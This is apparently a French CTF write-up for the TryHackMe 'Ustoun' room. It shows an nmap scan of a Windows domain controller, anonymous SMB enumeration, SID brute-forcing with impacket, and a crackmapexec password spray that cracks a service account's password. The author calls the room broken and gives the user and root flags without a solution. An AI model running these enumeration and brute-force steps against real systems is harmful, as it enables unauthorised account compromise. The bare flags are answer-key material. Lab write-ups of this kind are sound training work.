# USTOUN #

## Task 1 Introduction ##

## Task 2 Submitting Flags ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c 'echo "10.10.179.69 ustoun.thm" >> /etc/hosts'
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A ustoun.thm -p- -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 09:33 CEST
Nmap scan report for ustoun.thm (10.10.54.131)
Host is up (0.075s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE        VERSION
53/tcp    open  domain         Simple DNS Plus
88/tcp    open  kerberos-sec   Microsoft Windows Kerberos (server time: 2021-10-25 07:48:03Z)
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open  ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap           Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: DC01
|   NetBIOS_Domain_Name: DC01
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ustoun.local
|   DNS_Computer_Name: DC.ustoun.local
|   DNS_Tree_Name: ustoun.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-10-25T07:49:37+00:00
| ssl-cert: Subject: commonName=DC.ustoun.local
| Not valid before: 2021-10-24T07:26:33
|_Not valid after:  2022-04-25T07:26:33
|_ssl-date: 2021-10-25T07:49:46+00:00; +1s from scanner time.
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf         .NET Message Framing
47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc          Microsoft Windows RPC
49673/tcp open  msrpc          Microsoft Windows RPC
49676/tcp open  msrpc          Microsoft Windows RPC
49693/tcp open  msrpc          Microsoft Windows RPC
49700/tcp open  msrpc          Microsoft Windows RPC
49702/tcp open  msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/25%OT=53%CT=1%CU=42103%PV=Y%DS=2%DC=T%G=Y%TM=617661
OS:9C%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=2%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS
OS:%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-25T07:49:39
|_  start_date: N/A

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   32.73 ms 10.9.0.1
2   90.48 ms ustoun.thm (10.10.54.131)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 994.90 seconds
```

D'après nmap on a beaucoup de service et on est sur windows.  
Il y a un service de partage smb.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ smbmap -H ustoun.thm -u anonymous
[+] Guest session   	IP: ustoun.thm:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
```

On voit qu'il y a un partage ICP en lecture seule. 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ lookupsid.py anonymous@ustoun.thm
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at ustoun.thm
[*] StringBinding ncacn_np:ustoun.thm[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1901093607-1666369868-1126869414
498: DC01\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DC01\Administrator (SidTypeUser)
501: DC01\Guest (SidTypeUser)
502: DC01\krbtgt (SidTypeUser)
512: DC01\Domain Admins (SidTypeGroup)
513: DC01\Domain Users (SidTypeGroup)
514: DC01\Domain Guests (SidTypeGroup)
515: DC01\Domain Computers (SidTypeGroup)
516: DC01\Domain Controllers (SidTypeGroup)
517: DC01\Cert Publishers (SidTypeAlias)
518: DC01\Schema Admins (SidTypeGroup)
519: DC01\Enterprise Admins (SidTypeGroup)
520: DC01\Group Policy Creator Owners (SidTypeGroup)
521: DC01\Read-only Domain Controllers (SidTypeGroup)
522: DC01\Cloneable Domain Controllers (SidTypeGroup)
525: DC01\Protected Users (SidTypeGroup)
526: DC01\Key Admins (SidTypeGroup)
527: DC01\Enterprise Key Admins (SidTypeGroup)
553: DC01\RAS and IAS Servers (SidTypeAlias)
571: DC01\Allowed RODC Password Replication Group (SidTypeAlias)
572: DC01\Denied RODC Password Replication Group (SidTypeAlias)
1000: DC01\DC$ (SidTypeUser)
1101: DC01\DnsAdmins (SidTypeAlias)
1102: DC01\DnsUpdateProxy (SidTypeGroup)
1112: DC01\SVC-Kerb (SidTypeUser)
1114: DC01\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```

On regarde les utilisateur sur le partage IPC.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat user.txt 
Administrator
Guest
krbtgt
DC$
SVC-Kerb
```

On met les utilisateurs dans une liste.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ crackmapexec smb ustoun.thm -u 'SVC-Kerb' -p /usr/share/wordlists/rockyou.txt 
SMB         10.10.54.131    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:123456 STATUS_LOGON_FAILURE 
SMB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:12345 STATUS_LOGON_FAILURE 
SMB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:123456789 STATUS_LOGON_FAILURE 
SMB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:password STATUS_LOGON_FAILURE 
...
MB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:joshua STATUS_LOGON_FAILURE 
SMB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:bubbles STATUS_LOGON_FAILURE 
SMB         10.10.54.131    445    DC               [-] ustoun.local\SVC-Kerb:1234567890 STATUS_LOGON_FAILURE 
SMB         10.10.54.131    445    DC               [+] ustoun.local\SVC-Kerb:superman 
```

On casse le mot de passe smb qui est superman.   
On voit un nouveau sous domaine ustoun.local.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c 'echo "10.10.54.131 ustoun.local" >> /etc/hosts' 

```

Chez moi le room est impossible à faire le port 1433 et fermé room cassée.   
Si vous voulez les flags.

**What is the user flag?**
THM{MSSQL_IS_COOL}

**What is the root flag?**
THM{I_L1kE_gPoS}